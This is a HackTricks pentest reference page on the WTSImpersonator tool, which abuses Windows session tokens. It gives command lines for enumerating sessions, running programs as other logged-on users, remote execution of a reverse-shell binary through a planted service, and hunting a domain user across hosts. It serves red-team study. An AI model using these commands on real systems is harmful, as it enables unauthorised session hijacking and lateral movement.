---
title: "WTS Impersonator"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/stealing-credentials/wts-impersonator.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: windows
---

## Core functionality

Its local execution flow uses the following API sequence:[\[1\]](#references)[\[2\]](#references)

```
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules and usage

-
**Enumerate users:** The tool can enumerate sessions on the local or a remote host.
  - Locally:
```
.\WTSImpersonator.exe -m enum
```
  - Remotely, specify an IP address or hostname:
```
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
- Locally:
-
**Execute commands:** The`exec` and`exec-remote` modules need a service context. Microsoft documents that`WTSQueryUserToken` requires the caller to run as`LocalSystem` with the`SE_TCB_NAME` privilege.<sup>[\[2\]](#references)</sup>
  - Local command execution:
```
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
  - PsExec can start a `LocalSystem` command prompt for testing:```
.\PsExec64.exe -accepteula -s cmd.exe
```
- Local command execution:
-
**Remote command execution:** The remote mode creates a service on the target in a PsExec-like workflow and therefore requires rights to install and start that service.<sup>[\[1\]](#references)</sup>
  - Example:
```
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
- Example:
-
**User hunting:** The`user-hunter` module searches a host list for a named user’s session and attempts to execute the supplied program in that context.<sup>[\[1\]](#references)</sup>
  - Usage example:
```
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
- Usage example:

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
